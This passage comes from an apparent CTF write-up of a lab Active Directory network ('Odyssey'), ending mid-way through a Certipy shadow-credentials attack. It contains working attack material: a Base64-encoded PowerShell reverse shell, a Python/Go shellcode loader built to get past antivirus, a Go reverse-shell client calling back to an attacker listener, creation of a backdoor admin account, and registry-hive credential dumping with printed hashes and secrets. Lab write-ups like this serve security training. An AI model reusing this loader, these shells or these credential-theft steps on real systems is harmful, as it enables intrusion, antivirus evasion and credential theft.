SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL  
```

The output shows that `SeImpersonatePrivilege` is **Enabled**, while several other privileges are disabled. `SeImpersonatePrivilege` is particularly important because it allows a process to impersonate a client after authentication and is commonly relevant when evaluating Windows privilege-escalation paths. At this stage, we have moved from a recovered service-account credential to OS-level command execution on `ODYSSEY-DB`, running in the context of `odyssey\svc-mssql`.

The first attempt is to obtain a command shell through `xp_cmdshell` by executing an encoded PowerShell payload:

```shell
SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAyACIALAA0ADQANAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';
output                                                                                                                                                                                                                                                            
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
#< CLIXML                                                                                                                                                                                                                                                         

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing    

modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.32",4445) ..._   

x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S><S S="Error">    +   

 CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs> 
```

The `-e` option tells PowerShell to decode the supplied Base64 string and execute the resulting script. The decoded payload creates a TCP connection back to the attacking machine and redirects command input/output through that connection. However, the attempt fails before execution because the target's antivirus detects the decoded script as malicious. The returned `ScriptContainedMaliciousContent` error confirms that PowerShell's content is being inspected and blocked, so a different execution approach is required.

The next approach uses a compiled Windows loader rather than sending the reverse-shell PowerShell script directly. Here's the Loader that I've made:

```python
#!/usr/bin/env python3
# loader.py
import donut, secrets

# --- Step 1: convert payload to position-independent shellcode ---
raw = donut.create(file="GodPotato.exe", params=r'-cmd C:\ProgramData\GoRev.exe')

# --- Step 2: XOR-encrypt with a random session key ---
session_key = secrets.token_bytes(32)
cipher_blob = bytes(b ^ session_key[idx % len(session_key)] for idx, b in enumerate(raw))

# --- Step 3: emit Go byte-array literals ---
def go_literal(blob, var_name, width=20):
    body = []
    for offset in range(0, len(blob), width):
        row = blob[offset:offset + width]
        body.append("\t\t" + ", ".join("0x%02x" % v for v in row) + ",")
    return "var %s = [...]byte{\n%s\n\t}" % (var_name, "\n".join(body))

payload_decl = go_literal(cipher_blob, "payload")
key_decl     = go_literal(session_key, "k")

# --- Step 4: build the Go source (plain string + % formatting to avoid f-string brace issues) ---
go_source = '''package main

import (
\t"syscall"
\t"unsafe"
)

const (
\tcommitReserve = 0x3000
\tpageRW        = 0x04
\tpageExecRead  = 0x20
\tinfiniteWait  = 0xFFFFFFFF
)

%s

%s

func xorDecrypt(dst []byte) {
\tfor n := range dst {
\t\tdst[n] = payload[n] ^ k[n%%len(k)]
\t}
}

func execute(stage []byte) {
\tk32 := syscall.NewLazyDLL("kernel32.dll")
\talloc := k32.NewProc("VirtualAlloc")
\tprot := k32.NewProc("VirtualProtect")
\tthread := k32.NewProc("CreateThread")
\twait := k32.NewProc("WaitForSingleObject")

\tbase, _, _ := alloc.Call(0, uintptr(len(stage)), commitReserve, pageRW)

\tmem := (*[1 << 30]byte)(unsafe.Pointer(base))[:len(stage):len(stage)]
\tcopy(mem, stage)

\tvar prev uint32
\tprot.Call(base, uintptr(len(stage)), pageExecRead, uintptr(unsafe.Pointer(&prev)))

\th, _, _ := thread.Call(0, 0, base, 0, 0, 0)
\twait.Call(h, infiniteWait)
}

func main() {
\tstage := make([]byte, len(payload))
\txorDecrypt(stage)
\texecute(stage)
}
''' % (key_decl, payload_decl)

with open("GoLoader.go", "w") as fh:
    fh.write(go_source)

print(f"[+] GoLoader.go written ({len(raw)} byte shellcode embedded)")
```

The Python `loader.py` script converts `GodPotato.exe` into position-independent shellcode with Donut, XOR-encrypts that shellcode using a randomly generated key, and embeds both the encrypted payload and key into a generated Go program.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ python3 loader.py                                                                        
[+] GoLoader.go written (88555 byte shellcode embedded)
```

The resulting loader decrypts the payload in memory, allocates executable memory with Windows APIs such as `VirtualAlloc` and `VirtualProtect`, and starts it through `CreateThread`.

The loader is then compiled for Windows x64:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ GOOS=windows GOARCH=amd64 go build -o Loader.exe -ldflags "-s -w" GoLoader.go
```

A separate `GoRev.go` program is also compiled into `GoRev.exe`.

```go
package main

import (
	"bufio"
	"net"
	"os/exec"
	"strings"
)

func main() {
	conn, err := net.Dial("tcp", "172.16.0.12:9001")
	if err != nil { return }
	defer conn.Close()
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		cmd := exec.Command("cmd.exe", "/c", strings.TrimSpace(scanner.Text()))
		out, _ := cmd.CombinedOutput()
		conn.Write(out)
		conn.Write([]byte("PS C:\\> "))
	}
}
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ GOOS=windows GOARCH=amd64 go build -o GoRev.exe -ldflags "-s -w" GoRev.go   
```

Its purpose is to connect to the internal listener on `172.16.0.12:9001`, receive commands, execute them through `cmd.exe`, and return the command output over the TCP connection. The Ligolo-ng agent is then configured with two listeners: one forwards port `80` to the attacker's HTTP server for transferring the required binaries, while the other forwards port `9001` to the reverse-shell listener.&#x20;

```shellscript
[Agent : root@odyssey-web] » listener_add --tcp --to 10.10.17.133:80 --addr 0.0.0.0:80
INFO[0142] Listener 0 created on remote agent!          
[Agent : root@odyssey-web] » listener_add --tcp --to 10.10.17.133:9001 --addr 0.0.0.0:9001
INFO[0150] Listener 1 created on remote agent! 
```

The files are downloaded to the database server using `Invoke-WebRequest` through `xp_cmdshell`: &#x20;

```shell
SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://172.16.0.12/Loader.exe -OutFile C:/ProgramData/Loader.exe"';
output   
------   
NULL     

SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://172.16.0.12/GodPotato.exe -OutFile C:/ProgramData/GodPotato.exe"';
output   
------   
NULL     

SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://172.16.0.12/GoRev.exe -OutFile C:/ProgramData/GoRev.exe"';
output   
------   
NULL     
```

Finally, the loader is executed through SQL Server:

```shell
SQL (ODYSSEY\svc-mssql  dbo@master)> EXEC xp_cmdshell 'C:/ProgramData/Loader.exe';
```

The loader executes the embedded payload, which ultimately launches the prepared component and connects back through the Ligolo-ng forwarding path. On the attacking machine, `nc` waits for the connection:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nc -lnvp 9001                                                                
listening on [any] 9001 ...
connect to [10.10.17.133] from (UNKNOWN) [10.10.17.133] 37946

PS C:\> 
```

The resulting connection confirms that the target successfully reached the listener. In other words, the flow is **`xp_cmdshell` → download binaries → execute loader → in-memory payload execution → reverse connection**, avoiding the PowerShell payload that was previously stopped by antivirus.

# Lateral Movement to DC01

## AddKeyCredentialLink Abuse Against svc-aegis-build

After obtaining command execution on `ODYSSEY-DB` as `ODYSSEY\svc-mssql`, the next objective was to establish a reliable administrative account on the machine.

The current privileges were sufficient to create a new local user:

```powershell
PS C:\> net user kuro password023! /add
The command completed successfully.
```

The account was then added to the local `Administrators` group:

```powershell
PS C:\> net localgroup Administrators kuro /add
The command completed successfully.
```

The first command creates the local account, while the second grants it administrative privileges. This is significant because membership in the local `Administrators` group provides considerably more access than the original SQL Server service account.

The new credentials were tested remotely through `WinRM`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc winrm ODYSSEY-DB.odyssey.htb -u kuro -p password023! --local-auth
WINRM       172.16.0.11     5985   ODYSSEY-DB       [*] Windows 11 / Server 2025 Build 26100 (name:ODYSSEY-DB) (domain:odyssey.htb)
WINRM       172.16.0.11     5985   ODYSSEY-DB       [+] ODYSSEY-DB\kuro:password023! (Pwn3d!)
```

The `--local-auth` option is important here because `kuro` is a local account rather than a domain account. NetExec's `(Pwn3d!)` indicator shows that the supplied credentials provide administrative access to the target service.

With the credentials confirmed, an interactive WinRM session was established using `Evil-WinRM`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ evil-winrm -i ODYSSEY-DB.odyssey.htb -u kuro -p password023!
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                              
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\kuro\Documents> 
```

At this point, the compromise had progressed from SQL Server command execution to a persistent local administrator account on `ODYSSEY-DB`.

With a stable administrative shell available, the machine's active network connections were inspected:

```powershell
*Evil-WinRM* PS C:\Users\kuro\Documents> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       508
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       2964
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       796
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1180
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1660
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       796
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       780
  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       2964
  TCP    172.16.0.11:139        0.0.0.0:0              LISTENING       4
  TCP    172.16.0.11:5985       172.16.0.12:48938      TIME_WAIT       0
  TCP    172.16.0.11:5985       172.16.0.12:48944      ESTABLISHED     4
  TCP    172.16.0.11:49442      172.16.0.12:9001       ESTABLISHED     2892
  TCP    [::]:135               [::]:0                 LISTENING       508
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:1433              [::]:0                 LISTENING       2964
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       796
  TCP    [::]:49665             [::]:0                 LISTENING       652
  TCP    [::]:49666             [::]:0                 LISTENING       1180
  TCP    [::]:49667             [::]:0                 LISTENING       1660
  TCP    [::]:49668             [::]:0                 LISTENING       796
  TCP    [::]:49669             [::]:0                 LISTENING       780
  TCP    [::1]:1434             [::]:0                 LISTENING       2964
  UDP    0.0.0.0:123            *:*                                    1196
  UDP    0.0.0.0:5353           *:*                                    1476
  UDP    0.0.0.0:5355           *:*                                    1476
  UDP    127.0.0.1:56997        127.0.0.1:56997                        1660
  UDP    127.0.0.1:57506        127.0.0.1:57506                        2528
  UDP    172.16.0.11:137        *:*                                    4
  UDP    172.16.0.11:138        *:*                                    4
  UDP    [::]:123               *:*                                    1196
```

The output confirmed several important services:

* `135/tcp` — RPC
* `445/tcp` — SMB
* `1433/tcp` — Microsoft SQL Server
* `5985/tcp` — WinRM
* Several high-numbered RPC ports

More importantly, the output showed an established connection from `ODYSSEY-DB` (`172.16.0.11`) to `172.16.0.12:9001`. This corresponds to the reverse connection established earlier, confirming that the compromised database server was actively communicating through the pivot.

Because `kuro` was a local administrator, we could access the Windows registry hives containing local authentication material:

```powershell
*Evil-WinRM* PS C:\Users\kuro\Documents> reg save HKLM\SYSTEM sys.save; reg save HKLM\SAM sam.save; reg save HKLM\SECURITY sec.save; dir
 
The operation completed successfully.

The operation completed successfully.

The operation completed successfully.



    Directory: C:\Users\kuro\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/15/2026   8:27 PM          69632 sam.save
-a----         9/15/2026   8:27 PM          36864 sec.save
-a----         9/15/2026   8:27 PM       12816384 sys.save
```

These produced three registry hive backups:

* `SAM` — contains local account password hashes.
* `SYSTEM` — contains information required to derive the system boot key used to decrypt protected SAM data.
* `SECURITY` — contains additional security-related secrets, including cached domain credentials and LSA secrets.

The files were then downloaded through the Evil-WinRM session:

```powershell
*Evil-WinRM* PS C:\Users\kuro\Documents> download sam.save
                                        
Info: Downloading C:\Users\kuro\Documents\sam.save to sam.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\kuro\Documents> download sec.save
                                        
Info: Downloading C:\Users\kuro\Documents\sec.save to sec.save
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\kuro\Documents> download sys.save
                                        
Info: Downloading C:\Users\kuro\Documents\sys.save to sys.save
                                        
Info: Download successful!
```

The three registry hives were processed with Impacket's `secretsdump:`

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ impacket-secretsdump -system sys.save -security sec.save -sam sam.save LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2a96bead981fcdc2acd55f27c6aef09a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:09b463b3dec18b47a66c8b29e8ab187a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
kuro:1002:aad3b435b51404eeaad3b435b51404ee:f10222f0c2f05b1c877d4373c616f3ad:::
[*] Dumping cached domain logon information (domain/username:hash)
ODYSSEY.HTB/svc-mssql:$DCC2$10240#svc-mssql#9711ac11a96646823b1d3726c16a388a: (2026-05-13 20:50:23+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:5c005e005e002a006c003e006c00230031003000490021005b0058006d00210053006e00350074002c0069006b003f006300390069005f003a00790042003a006400300039005c0047003a00560079007a00320022003f0049006b006e0051002a00300021005f0061005e007a0067006b006a006f003a005f00490079006d002c00750066002500440052005e00670052004a0067003600540028005f004000200048004f0026002400540073006d004b004e002900690024005d00320031002200260072005700250077003a0027005f005e004e004c0042004300220070006800420050002f003800220022005a00
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:71bc6be8565f0c9871070c3912b1680d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd67b95188725a1dbbc68ca213aea9a841336a946
dpapi_userkey:0xfb545a8b628536e7ec77b39841194d6ef2eb1075
[*] NL$KM 
 0000   64 49 1F 7E DE 2D 8F CA  ED 68 E6 AB A0 3B CF 62   dI.~.-...h...;.b
 0010   06 71 DF AC E8 74 CB 9A  21 F0 F5 1B EA 14 BE E9   .q...t..!.......
 0020   DE AE 62 6E 88 E5 47 49  29 48 B1 20 E8 4A 76 09   ..bn..GI)H. .Jv.
 0030   A0 F5 B6 F4 DD 72 04 82  F9 E6 FA CA 97 D5 3D BF   .....r........=.
NL$KM:64491f7ede2d8fcaed68e6aba03bcf620671dface874cb9a21f0f51bea14bee9deae626e88e547492948b120e84a7609a0f5b6f4dd720482f9e6faca97d53dbf
[*] _SC_MSSQLSERVER 
(Unknown User):cml958782
[*] Cleaning up...
```

Using `LOCAL` tells `secretsdump` that the supplied registry hives belong to the local machine rather than a remote domain controller.

While multiple secrets are recovered during the extraction process, the machine account hash stands out as the only credential that provides a meaningful path for further enumeration and exploitation.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ nxc ldap DC01.odyssey.htb -u ODYSSEY-DB$ -H 71bc6be8565f0c9871070c3912b1680d
LDAPS       172.16.0.10     636    DC01             [+] odyssey.htb\ODYSSEY-DB$:71bc6be8565f0c9871070c3912b1680d
```

Kerberos is highly sensitive to time discrepancies, and even a small clock drift between the client and the Domain Controller can cause authentication requests to fail. To prevent this issue, the attacker's host was synchronized with the Domain Controller using `ntpdate`, ensuring both systems shared an accurate time reference.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ sudo ntpdate DC01 && impacket-getTGT odyssey.htb/svc-mssql:cml958782 -dc-ip 172.16.0.10
2026-09-15 23:45:15.431021 (-0400) -47.963615 +/- 0.207657 DC01 172.16.0.10 s1 no-leap
CLOCK: time stepped by -47.963615
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc-mssql.ccache
```

Once time synchronization was completed, the compromised credentials for the `svc-mssql` service account were used to request a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC) running on the Domain Controller. The `impacket-getTGT` utility authenticated to Active Directory and successfully obtained a Kerberos TGT, which was subsequently saved as a credential cache file (`svc-mssql.ccache`). This ticket enabled Kerberos-based authentication for subsequent enumeration activities without repeatedly transmitting plaintext credentials across the network.

After obtaining a valid Kerberos ticket, comprehensive Active Directory enumeration was performed using `RustHound-CE`. Prior to launching the collection process, the attacker's clock was synchronized once more to ensure continued compatibility with Kerberos authentication. The enumeration was conducted using the previously acquired Kerberos ticket rather than a password, leveraging the cached credentials generated during the earlier authentication step.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ sudo ntpdate -u DC01 && rusthound-ce -d odyssey.htb -u SVC-MSSQL@odyssey.htb -k -f DC01.odyssey.htb -i 172.16.0.10 -n 172.16.0.10 -c All -z
2026-09-16 00:24:36.475656 (-0400) -0.230314 +/- 0.210755 DC01 172.16.0.10 s1 no-leap
---------------------------------------------------
Initializing RustHound-CE at 00:24:36 on 09/16/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-09-16T04:24:36Z INFO  rusthound_ce] Verbosity level: Info
[2026-09-16T04:24:36Z INFO  rusthound_ce] Collection method: All
[2026-09-16T04:24:38Z INFO  rusthound_ce::transport::ldap] Connected to ODYSSEY.HTB Active Directory!
[2026-09-16T04:24:38Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-16T04:24:45Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=odyssey,DC=htb
[2026-09-16T04:24:45Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-16T04:24:45Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=odyssey,DC=htb
[2026-09-16T04:24:45Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-16T04:24:46Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=odyssey,DC=htb
[2026-09-16T04:24:46Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-16T04:24:46Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=odyssey,DC=htb
[2026-09-16T04:24:46Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-16T04:24:49Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Configuration,DC=odyssey,DC=htb
[2026-09-16T04:24:49Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 21%                                                                                                                            [2026-09-16T04:24:49Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10                                                                     
[2026-09-16T04:24:49Z INFO  rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates
[2026-09-16T04:24:49Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-09-16T04:24:49Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-09-16T04:24:49Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-09-16T04:24:49Z INFO  rusthound_ce::modules::sessions] [sessions] 0 active target(s) after expiry/enabled filter
[2026-09-16T04:24:49Z INFO  rusthound_ce::modules::sessions] [sessions] 0 session(s) enumerated in total across 0 host(s)
[2026-09-16T04:24:49Z INFO  rusthound_ce::modules] Starting ESC8 web enrollment probe on 1 CA(s)...
[2026-09-16T04:25:03Z INFO  rusthound_ce::modules::gpo::sysvol] [gpo] collected directives from 1 GPO(s) on DC01.odyssey.htb SYSVOL
[2026-09-16T04:25:03Z INFO  rusthound_ce::modules] [gpo] mapping 1 GPO(s) to GPOChanges / UserRights
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 12 users parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 71 groups parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 3 computers parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 4 ous parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-09-16T04:25:03Z INFO  rusthound_ce::json::maker::common] .//20260916002503_odyssey-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 00:25:03 on 09/16/26! Happy Graphing!
```

`RustHound-CE` connected successfully to the `ODYSSEY.HTB` domain and began collecting information from multiple LDAP naming contexts, including the domain partition, configuration partition, schema partition, and DNS-related partitions. By specifying the `All` collection method, the tool gathered a broad set of Active Directory objects and relationships, including users, groups, computers, Organizational Units (OUs), Group Policy Objects (GPOs), Certificate Services components, and privilege assignments. The collected data would later be imported into BloodHound for graphical analysis of attack paths and privilege escalation opportunities.

During the enumeration process, several noteworthy domain characteristics were identified. The environment contained a `MachineAccountQuota` value of `10`, indicating that authenticated users were permitted to create up to ten computer accounts within the domain. Additionally, the presence of an Enterprise Certificate Authority and eleven enabled certificate templates suggested that Active Directory Certificate Services (AD CS) was deployed within the environment, making certificate-based attack paths a potential area for further investigation. `RustHound-CE` also performed additional checks, including Group Policy analysis and ESC8 web enrollment probing against the detected Certificate Authority.

The enumeration concluded successfully, producing a compressed BloodHound-compatible dataset containing information about the domain's users, groups, computers, containers, certificate templates, certificate authorities, and policy objects. The resulting archive could then be imported into BloodHound to identify privilege escalation paths, delegated permissions, certificate abuse opportunities, and potential routes to higher-privileged accounts within the domain.

**No OOC privileges were identified for the MSSQL account.**

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FR9us8odyC3g14IX79f2C%252FScreenshot%2520%283385%29.png%3Falt%3Dmedia%26token%3D8998607b-c78d-4aff-8b2d-10dc6d26cad4&width=768&dpr=3&quality=100&sign=d77802683ed1cdfbc5aefb6540ab390c&sv=3)

**However, the `ODYSSEY-DB$` machine account possessed several interesting privileges and relationships.**

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FpIX194ZqFyQsjyS2zwqn%252FScreenshot%2520%283386%29.png%3Falt%3Dmedia%26token%3D2e8d3f65-c0a0-48f1-a277-494cd403450b&width=768&dpr=3&quality=100&sign=37e959f8d271741829c90697ec938bcd&sv=3)

Here's an interesting one:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F3WQqE0icUXqO2cHdTbrG%252FScreenshot%2520%283387%29.png%3Falt%3Dmedia%26token%3D21f92f92-a2ed-4afc-8630-2f9c80657af9&width=768&dpr=3&quality=100&sign=b72a3219b5da4fa70df163b3930f8cce&sv=3)

This BloodHound graph illustrates a privilege escalation path starting from the computer object `ODYSSEY-DB.ODYSSEY.H....` The computer is a member of the `BUILD HOSTS@ODYSSEY...` group, which in turn is a member of the `PIPELINE TRUSTEES@OD...` group. That group is itself a member of the `ATTEST KEY MANAGERS@...` group, establishing a chain of nested group memberships that effectively grants the originating computer (and any principal that can control it) the aggregated rights of the final group.

The terminal edge shows that the `ATTEST KEY MANAGERS` group possesses the **AddKeyCredentialLink** permission on the service account `SVC-AEGIS-BUILD@ODYS....` This right enables a Shadow Credentials attack: an attacker who compromises the computer or any intermediate group can write a new key credential to the target user object, allowing authentication as that account without knowing its password. The resulting path therefore represents a high-impact attack vector from a build host into a privileged service account.

After mapping the `AddKeyCredentialLink` privilege on svc-aegis-build through the nested group membership path (**ODYSSEY-DB → BUILD HOSTS → PIPELINE TRUSTEES → ATTEST KEY MANAGERS**), the compromised computer account was leveraged to perform a classic Shadow Credentials attack. Certipy was used with the machine account hash of `ODYSSEY-DB$` to generate a key credential, inject it into the target’s **msDS-KeyCredentialLink** attribute, authenticate via PKINIT, and extract the NT hash:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Odyssey]
└─$ certipy-ad shadow auto -u 'ODYSSEY-DB$@odyssey.htb' -hashes :71bc6be8565f0c9871070c3912b1680d -account svc-aegis-build -dc-ip 172.16.0.10
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'svc-aegis-build'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '84ec8ac6-a58c-c42b-16fe-5e88fca02054'
